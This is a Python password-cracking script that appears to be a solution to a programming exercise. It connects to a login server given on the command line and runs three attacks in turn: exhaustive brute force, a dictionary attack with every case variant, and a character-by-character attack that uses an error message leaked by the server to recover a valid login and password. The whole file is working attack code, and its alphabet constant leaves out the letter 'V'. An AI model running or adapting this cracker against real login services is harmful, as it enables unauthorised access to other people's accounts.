import sys
import socket
import itertools
import os
import json

ALPHA_DIG = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789"

def orginize_file_data(file):
    pass_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), file)
    with open(pass_path, "r") as stream:
        datas = stream.readlines()

    datas = [data.replace("\n", "") for data in datas]
    return datas

def checker(data, client_socket, bufor=1024):
    if type(data) is dict and data["password"] == " ":
        p = json.dumps(data)
        bp = p.encode()
        client_socket.send(bp)
        response = client_socket.recv(bufor)
        response = response.decode()
        response = json.loads(response)
        if response["result"] == "Wrong password!":
            return data

    if type(data) is dict and data["password"] != " ":
        p = json.dumps(data)
        bp = p.encode()
        client_socket.send(bp)
        response = client_socket.recv(bufor)
        response = response.decode()
        response = json.loads(response)
        if response["result"] == "Exception happened during login":
            return data
        if response["result"] == "Connection success!":
            return response["result"]

    for p in data:
        bp = p.encode()
        client_socket.send(bp)
        response = client_socket.recv(bufor)
        response = response.decode()
        if response == "Connection success!":
            return p

def brute_force_possibl(rep):
    brute_force_str = ALPHA_DIG
    pswrds = itertools.product(brute_force_str, repeat=rep)
    for pswr in pswrds:
        data = "".join(pswr)
        yield data

def brute_force(client_socket):
    rep = 1
    flag = True
    while flag:
        data = brute_force_possibl(rep)
        check = checker(data, client_socket)
        if check:
            return check
        rep += 1

def dict_brute_force_possibl():
    datas = orginize_file_data("password.txt")

    for data in datas:
        word_low_up = itertools.product(*([char.lower(), char.upper()] for char in data))
        for word in word_low_up:
            word = "".join(word)
            yield word

def dict_brute_force(client_socket):
     data = dict_brute_force_possibl()
     check = checker(data, client_socket, bufor=10240)
     if check:
         return check

def exploit_login_possibl():
    pass

def exploit_vonul(client_socket):
    logins = orginize_file_data("login.txt")
    for login in logins:
        passwrd = " "
        data = {"login": login,
                "password": passwrd}

        corr_log = checker(data, client_socket)
        if corr_log:
            corr_log = corr_log["login"]
            corr_pass = ""
            flag = True
            while flag:
                for char in ALPHA_DIG:
                    pass_char = corr_pass + char
                    data = {"login": corr_log, "password": pass_char}
                    corr_pass_char = checker(data, client_socket)
                    if corr_pass_char == "Connection success!":
                        corr_pass += char
                        flag = False
                        break
                    if corr_pass_char:
                        corr_pass += char

            return json.dumps({"login": corr_log, "password": corr_pass})

def connect(client_socket):
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    address = (hostname, port)
    client_socket.connect(address)


def main():
    with socket.socket() as client_socket:
        connect(client_socket)
        print(brute_force(client_socket))
        print(dict_brute_force(client_socket))
        print(exploit_vonul(client_socket))

if __name__ == "__main__":
    main()


